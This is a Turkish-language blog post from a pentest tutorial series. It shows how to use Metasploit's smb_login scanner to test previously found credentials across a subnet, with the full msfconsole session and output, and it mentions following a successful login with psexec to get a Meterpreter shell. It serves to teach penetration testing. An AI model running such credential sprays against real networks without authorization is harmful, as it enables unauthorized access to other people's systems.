---
layout: post
title: MSF İçinde SMB Login Kontrolü
date: 2017-05-18 08:00:06.000000000 +02:00
type: post
author: siberoloji
img: metasploit.jpg
published: true
status: publish
categories:
- Nasıl
- Araştırma
tags:
- msfconsole
- metasploit Framework
- Metasploit Framework smb login
- msf smb login
excerpt: Yaptığınız taramalarda, bir şekilde kullanıcı adı ve parola bulduğunuzu düşünüyorsunuz. Bu kullanıcı adı ve parolanın başka hangi servislerde kullanıldığını denemek isteyebilirsiniz. Bu noktada denenebilecek en mantıklı servis ```SMB``` olarak adlandırılan ağ üzerinde dosya paylaşım servisidir.
---

Önceki yazılarımızda "Bilgi Toplama" modüllerinden bir kısmını gördük. IP ve Port tarama ile birlikte servislerin bulunmadı konularını ele aldık. Bir sonraki aşama "Zafiyet Taraması" olarak adlandırılır. Pentest aşamalarından "Bilgi Toplama" işlemleri ne kadar iyi ve sağlıklı yapılırsa, sonraki aşamalarda verim elde etmeniz de o kadar mümkün olacaktır.

Yaptığınız taramalarda, bir şekilde kullanıcı adı ve parola bulduğunuzu düşünüyorsunuz. Bu kullanıcı adı ve parolanın başka hangi servislerde kullanıldığını denemek isteyebilirsiniz. Bu noktada denenebilecek en mantıklı servis ```SMB``` olarak adlandırılan ağ üzerinde dosya paylaşım servisidir. 

Aşağıdaki örnekte, ```smb_login``` modülü kullanılmakta ve önceden bulunan bir kullanıcı adı ve parola denenmektedir. Bu tarama türünde, hedef bilgisayar Windows ise dikkatli olmalısınız çünkü başarısız her deneme, sistem yöneticisine ikaz olarak iletilir. ```smb_login``` taramanın çok gürültü çıkarttığını bilmelisiniz.

Yaptığınız ```smb_login``` taramasında başarılı bir oturum açma gerçekleşirse, devamında ```windows/smb/psexec``` modülünü kullanarak ```Meterpreter``` shell açma denenebilir.

```sh
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(smb_login) > show options

Module options (auxiliary/scanner/smb/smb_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   PASS_FILE                          no        File containing passwords, one per line
   PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             445              yes       Set the SMB service port
   SMBDomain         WORKGROUP        no        SMB Domain
   SMBPass                            no        SMB Password
   SMBUser                            no        SMB Username
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      true             no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(smb_login) > set RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf auxiliary(smb_login) > set SMBUser victim
SMBUser => victim
msf auxiliary(smb_login) > set SMBPass s3cr3t
SMBPass => s3cr3t
msf auxiliary(smb_login) > set THREADS 50
THREADS => 50
msf auxiliary(smb_login) > run

[*] 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
[*] 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
[*] 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
[*] 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
[*] 192.168.1.116 - SUCCESSFUL LOGIN (Unix)
[*] Auxiliary module execution completed

msf auxiliary(smb_login) >
```
Örnek çıktıda görüldüğü gibi, ```192.168.1.116``` IP adresinde başarılı bir oturum açma işlemi gerçekleşmiştir.